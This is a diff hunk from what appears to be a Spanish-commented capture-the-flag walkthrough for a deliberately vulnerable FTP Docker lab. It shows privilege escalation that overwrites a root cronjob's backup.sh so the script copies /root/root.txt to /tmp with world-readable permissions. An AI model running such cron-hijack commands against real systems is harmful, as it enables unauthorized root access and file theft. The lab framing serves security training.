@@ -64,11 +64,11 @@ chmod +x /usr/local/bin/backup.sh
 sudo su
 cat /root/root.txt
 
-# Opcion C (mas simple):
-echo -e '#!/bin/bash\nchmod 777 /root/root.txt' > /usr/local/bin/backup.sh
-chmod +x /usr/local/bin/backup.sh
-# Esperar 1 minuto
-cat /root/root.txt
+# Opcion C (copiar flag a /tmp):
+echo -e '#!/bin/bash\ncp /root/root.txt /tmp/root.txt\nchmod 777 /tmp/root.txt' > /usr/local/bin/backup.sh
+# Esperar 1 minuto a que el cronjob ejecute backup.sh
+cat /tmp/root.txt
+# -> technova{root_flag_here}
 
 # 9. Limpiar
 sudo docker stop ftp-vuln && sudo docker rm ftp-vuln
